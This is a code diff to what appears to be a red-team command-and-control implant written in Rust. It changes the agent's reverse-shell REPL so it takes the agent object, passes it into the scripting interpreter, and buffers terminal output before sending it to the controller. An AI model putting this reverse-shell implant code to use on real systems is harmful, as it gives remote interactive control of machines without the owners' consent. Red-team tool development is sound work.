@@ -3,6 +3,7 @@ use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse}
 use portable_pty::{native_pty_system, CommandBuilder, PtySize};
 use std::io::{Read, Write};
 use std::path::Path;
+use std::sync::Arc;
 use transport::Transport;
 
 use crossterm::{
@@ -13,6 +14,8 @@ use crossterm::{
 use eldritch_core::Value;
 use eldritch_repl::{Input, Repl, ReplAction};
 use eldritchv2::Interpreter;
+
+use crate::agent::ImixAgent;
 
 pub async fn run_reverse_shell_pty<T: Transport>(
     task_id: i64,
@@ -191,7 +194,10 @@ pub async fn run_reverse_shell_pty<T: Transport>(
     Ok(())
 }
 
-pub async fn run_repl_reverse_shell<T: Transport>(task_id: i64, mut transport: T) -> Result<()> {
+pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
+    task_id: i64,
+    agent: ImixAgent<T>,
+) -> Result<()> {
     // Channels to manage gRPC stream
     let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
     let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);
@@ -213,26 +219,34 @@ pub async fn run_repl_reverse_shell<T: Transport>(task_id: i64, mut transport: T
     }
 
     // Initiate gRPC stream
-    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
-        return Err(e.into());
+    // We need to acquire the lock to get mutable access to transport
+    {
+        let mut transport = agent.transport.write().await;
+        if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
+            return Err(e.into());
+        }
     }
 
     // Move logic to blocking thread
-    run_repl_loop(task_id, input_rx, output_tx).await;
+    run_repl_loop(task_id, input_rx, output_tx, agent).await;
     Ok(())
 }
 
-async fn run_repl_loop(
+async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
     task_id: i64,
     mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
     output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
+    agent: ImixAgent<T>,
 ) {
     let _ = tokio::task::spawn_blocking(move || {
-        let mut interpreter = Interpreter::new().with_default_libs();
+        let mut interpreter = Interpreter::new()
+            .with_default_libs()
+            .with_agent(Arc::new(agent));
         let mut repl = Repl::new();
         let mut stdout = VtWriter {
             tx: output_tx,
             task_id,
+            buffer: Vec::new(),
         };
 
         let _ = render(&mut stdout, &repl);
@@ -304,29 +318,37 @@ async fn run_repl_loop(
 struct VtWriter {
     tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
     task_id: i64,
+    buffer: Vec<u8>,
 }
 
 impl std::io::Write for VtWriter {
     fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
-        let data = buf.to_vec();
-        match self.tx.blocking_send(ReverseShellRequest {
-            kind: ReverseShellMessageKind::Data.into(),
-            data,
-            task_id: self.task_id,
-        }) {
-            Ok(_) => Ok(buf.len()),
-            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
-        }
+        self.buffer.extend_from_slice(buf);
+        Ok(buf.len())
     }
 
     fn flush(&mut self) -> std::io::Result<()> {
-        match self.tx.blocking_send(ReverseShellRequest {
-            kind: ReverseShellMessageKind::Ping.into(),
-            data: Vec::new(),
-            task_id: self.task_id,
-        }) {
-            Ok(_) => Ok(()),
-            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
+        if self.buffer.is_empty() {
+            // Send a ping if buffer is empty to keep connection alive or signal "done"
+            match self.tx.blocking_send(ReverseShellRequest {
+                kind: ReverseShellMessageKind::Ping.into(),
+                data: Vec::new(),
+                task_id: self.task_id,
+            }) {
+                Ok(_) => Ok(()),
+                Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
+            }
+        } else {
+            // Send buffered data
+            let data = std::mem::take(&mut self.buffer);
+            match self.tx.blocking_send(ReverseShellRequest {
+                kind: ReverseShellMessageKind::Data.into(),
+                data,
+                task_id: self.task_id,
+            }) {
+                Ok(_) => Ok(()),
+                Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
+            }
         }
     }
 }
